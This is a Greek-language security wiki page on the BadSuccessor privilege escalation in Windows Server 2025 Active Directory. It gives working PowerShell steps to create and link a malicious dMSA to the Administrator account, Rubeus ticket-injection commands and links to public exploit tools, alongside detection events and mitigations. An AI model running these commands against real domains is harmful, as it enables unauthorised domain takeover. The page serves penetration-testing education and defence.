# BadSuccessor: Privilege Escalation μέσω κατάχρησης μετεγκατάστασης Delegated MSA

{{#include ../../banners/hacktricks-training.md}}

## Επισκόπηση

Οι Delegated Managed Service Accounts (**dMSA**) είναι οι διάδοχοι επόμενης γενιάς των **gMSA** και περιλαμβάνονται στον Windows Server 2025. Μια νόμιμη διαδικασία μετεγκατάστασης επιτρέπει στους διαχειριστές να αντικαταστήσουν έναν *παλιό* λογαριασμό (χρήστη, υπολογιστή ή λογαριασμό υπηρεσίας) με έναν dMSA, διατηρώντας διαφανώς τα δικαιώματα. Η διαδικασία εκτίθεται μέσω cmdlets του PowerShell, όπως τα `Start-ADServiceAccountMigration` και `Complete-ADServiceAccountMigration`, και βασίζεται σε δύο χαρακτηριστικά LDAP του **αντικειμένου dMSA**:

* **`msDS-ManagedAccountPrecededByLink`** – *σύνδεσμος DN* προς τον λογαριασμό που αντικαταστάθηκε (τον παλιό).
* **`msDS-DelegatedMSAState`**       – κατάσταση μετεγκατάστασης (`0` = καμία, `1` = σε εξέλιξη, `2` = *ολοκληρωμένη*).<sup>[[1]](#references)</sup>

Αν ένας επιτιθέμενος μπορεί να δημιουργήσει **οποιονδήποτε** dMSA μέσα σε ένα OU και να τροποποιήσει απευθείας αυτά τα 2 χαρακτηριστικά, τα LSASS και KDC θα αντιμετωπίσουν τον dMSA ως *διάδοχο* του συνδεδεμένου λογαριασμού. Όταν στη συνέχεια ο επιτιθέμενος πιστοποιηθεί ως ο dMSA, **κληρονομεί όλα τα προνόμια του συνδεδεμένου λογαριασμού** – μέχρι και τα προνόμια του **Domain Admin**, αν έχει συνδεθεί ο λογαριασμός Administrator.<sup>[[1]](#references)</sup>

Η Unit 42 ονόμασε αυτήν την τεχνική **BadSuccessor** το 2025. Η Microsoft αργότερα της εκχώρησε το **CVE-2025-53779** και κυκλοφόρησε ενημέρωση ασφαλείας τον **Αύγουστο του 2025**. Η τεχνική εξακολουθεί να αφορά περιβάλλοντα Windows Server 2025 που δεν έχουν ενημερωθεί, καθώς και ελέγχους επικίνδυνων αναθέσεων δικαιωμάτων σε OU.<sup>[[1]](#references)[[2]](#references)[[6]](#references)</sup>

Σε ενημερωμένους DC, μια [αμφίδρομη μετεγκατάσταση dMSA](acl-persistence-abuse/BadSuccessor.md#bettersuccessor-after-the-kdc-patch) μπορεί και πάλι να εκθέσει έναν λογαριασμό-στόχο, όταν ο επιτιθέμενος μπορεί επίσης να γράψει στα χαρακτηριστικά μετεγκατάστασής του. Αυτό είναι πιο περιορισμένο από την αρχική επίθεση που στόχευε αυθαίρετους λογαριασμούς.

### Προϋποθέσεις επίθεσης

1. Ένας λογαριασμός που *επιτρέπεται* να δημιουργεί αντικείμενα μέσα σε **μια Organizational Unit (OU)** *και* έχει τουλάχιστον ένα από τα εξής:
   * `Create Child` → κλάση αντικειμένου **`msDS-DelegatedManagedServiceAccount`**
   * `Create Child` → **`All Objects`** (γενική δημιουργία)
2. Συνδεσιμότητα δικτύου προς LDAP και Kerberos (τυπικό σενάριο με σύνδεση σε domain / απομακρυσμένη επίθεση).<sup>[[1]](#references)</sup>

## Εντοπισμός ευάλωτων OU

Η Unit 42 κυκλοφόρησε ένα βοηθητικό script PowerShell που αναλύει τους περιγραφείς ασφαλείας κάθε OU και επισημαίνει τα απαιτούμενα ACE:<sup>[[1]](#references)</sup>

```powershell
Get-BadSuccessorOUPermissions.ps1 -Domain contoso.local
```

Στο παρασκήνιο, το script εκτελεί μια σελιδοποιημένη αναζήτηση LDAP για `(objectClass=organizationalUnit)` και ελέγχει κάθε `nTSecurityDescriptor` για

* `ADS_RIGHT_DS_CREATE_CHILD` (0x0001)
* `Active Directory Schema ID: 31ed51fa-77b1-4175-884a-5c6f3f6f34e8` (κλάση αντικειμένου *msDS-DelegatedManagedServiceAccount*)

## Βήματα εκμετάλλευσης

Μόλις εντοπιστεί ένα εγγράψιμο OU, η επίθεση απέχει μόλις 3 εγγραφές LDAP:<sup>[[1]](#references)</sup>

```powershell
# 1. Create a new delegated MSA inside the delegated OU
New-ADServiceAccount -Name attacker_dMSA \
                     -DNSHostName host.contoso.local \
                     -Path "OU=DelegatedOU,DC=contoso,DC=com"

# 2. Point the dMSA to the target account (e.g. Domain Admin)
Set-ADServiceAccount attacker_dMSA -Add \
    @{msDS-ManagedAccountPrecededByLink="CN=Administrator,CN=Users,DC=contoso,DC=com"}

# 3. Mark the migration as *completed*
Set-ADServiceAccount attacker_dMSA -Replace @{msDS-DelegatedMSAState=2}
```

Μετά την αναπαραγωγή, ο attacker μπορεί απλώς να κάνει **logon** ως `attacker_dMSA$` ή να ζητήσει ένα Kerberos TGT – τα Windows θα δημιουργήσουν το token του *αντικατασταθέντος* λογαριασμού.<sup>[[1]](#references)</sup>

### Αυτοματοποίηση

Αρκετά δημόσια PoC περιλαμβάνουν ολόκληρη τη ροή εργασιών, συμπεριλαμβανομένης της ανάκτησης κωδικού πρόσβασης και της διαχείρισης ticket:

* SharpSuccessor (C#) – [https://github.com/logangoins/SharpSuccessor](https://github.com/logangoins/SharpSuccessor)<sup>[[3]](#references)</sup>
* BadSuccessor.ps1 (PowerShell) – [https://github.com/LuemmelSec/Pentest-Tools-Collection/blob/main/tools/ActiveDirectory/BadSuccessor.ps1](https://github.com/LuemmelSec/Pentest-Tools-Collection/blob/main/tools/ActiveDirectory/BadSuccessor.ps1)<sup>[[4]](#references)</sup>
* Μονάδα NetExec – `badsuccessor` (Python) – [https://github.com/Pennyw0rth/NetExec](https://github.com/Pennyw0rth/NetExec)<sup>[[5]](#references)</sup>

### Post-Exploitation

```powershell
# Request a TGT for the dMSA and inject it (Rubeus)
Rubeus asktgt /user:attacker_dMSA$ /password:<ClearTextPwd> /domain:contoso.local
Rubeus ptt /ticket:<Base64TGT>

# Access Domain Admin resources
dir \\DC01\C$
```

## Ανίχνευση και αναζήτηση

Ενεργοποιήστε το **Object Auditing** στις OU και παρακολουθείτε τα ακόλουθα Windows Security Events:<sup>[[1]](#references)[[2]](#references)</sup>

* **5137** – Δημιουργία του αντικειμένου **dMSA**
* **5136** – Τροποποίηση του **`msDS-ManagedAccountPrecededByLink`**
* **4662** – Αλλαγές συγκεκριμένων attributes
  * GUID `2f5c138a-bd38-4016-88b4-0ec87cbb4919` → `msDS-DelegatedMSAState`
  * GUID `a0945b2b-57a2-43bd-b327-4d112a4e8bd1` → `msDS-ManagedAccountPrecededByLink`
* **2946** – Έκδοση TGT για το dMSA

Η συσχέτιση των `4662` (τροποποίηση attribute), `4741` (δημιουργία λογαριασμού υπολογιστή/υπηρεσίας) και `4624` (μεταγενέστερη σύνδεση) αναδεικνύει γρήγορα δραστηριότητα BadSuccessor. Λύσεις XDR όπως το **XSIAM** διαθέτουν έτοιμα queries (βλ. αναφορές).<sup>[[2]](#references)</sup>

## Μετριασμός

* Εγκαταστήστε την ενημέρωση ασφαλείας της Microsoft για το **CVE-2025-53779** και επαληθεύστε το επίπεδο ενημερώσεων κώδικα κάθε domain controller με Windows Server 2025.<sup>[[6]](#references)</sup>
* Εφαρμόστε την αρχή των **ελάχιστων προνομίων** – αναθέστε τη διαχείριση *Service Account* μόνο σε έμπιστους ρόλους.
* Αφαιρέστε τα `Create Child` / `msDS-DelegatedManagedServiceAccount` από OU που δεν τα χρειάζονται ρητά.
* Παρακολουθείτε τα event ID που αναφέρονται παραπάνω και ενεργοποιήστε ειδοποιήσεις όταν ταυτότητες *non-Tier-0* δημιουργούν ή επεξεργάζονται dMSA.

## Δείτε επίσης


{{#ref}}
golden-dmsa-gmsa.md
{{#endref}}

## References

- [1] [BadSuccessor: Κατάχρηση dMSA για κλιμάκωση προνομίων στο Active Directory – Akamai](https://www.akamai.com/blog/security-research/abusing-dmsa-for-privilege-escalation-in-active-directory)
- [2] [Unit42 – Όταν οι καλοί λογαριασμοί γίνονται κακοί: Εκμετάλλευση Delegated Managed Service Accounts](https://unit42.paloaltonetworks.com/badsuccessor-attack-vector/)
- [3] [SharpSuccessor PoC](https://github.com/logangoins/SharpSuccessor)
- [4] [BadSuccessor.ps1 – Pentest-Tools-Collection](https://github.com/LuemmelSec/Pentest-Tools-Collection/blob/main/tools/ActiveDirectory/BadSuccessor.ps1)
- [5] [Μονάδα BadSuccessor του NetExec](https://github.com/Pennyw0rth/NetExec/blob/main/nxc/modules/badsuccessor.py)
- [6] [Κέντρο Αντιμετώπισης Ζητημάτων Ασφαλείας της Microsoft – CVE-2025-53779](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-53779)
{{#include ../../banners/hacktricks-training.md}}
